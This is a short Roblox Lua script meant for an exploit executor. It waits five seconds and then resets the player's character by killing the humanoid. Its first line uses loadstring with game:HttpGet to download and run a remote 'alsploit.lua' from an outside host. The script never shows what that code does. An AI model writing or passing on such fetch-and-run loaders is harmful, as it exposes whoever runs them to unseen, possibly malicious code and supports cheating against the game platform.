loadstring(game:HttpGet("https://r2.packetroblox.xyz/alsploit.lua", true))()

local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- wait for character to exist (handles respawn too)
local function getCharacter()
    return player.Character or player.CharacterAdded:Wait()
end

task.wait(5) -- 5-second delay

local char = getCharacter()
local hum = char:FindFirstChildOfClass("Humanoid")

if hum then
    -- “Reset” the legit way: kill the humanoid (same result as ESC+R)
    hum:ChangeState(Enum.HumanoidStateType.Dead)
    hum.Health = 0
else
    -- fallback if no humanoid for some reason
    char:BreakJoints()
end
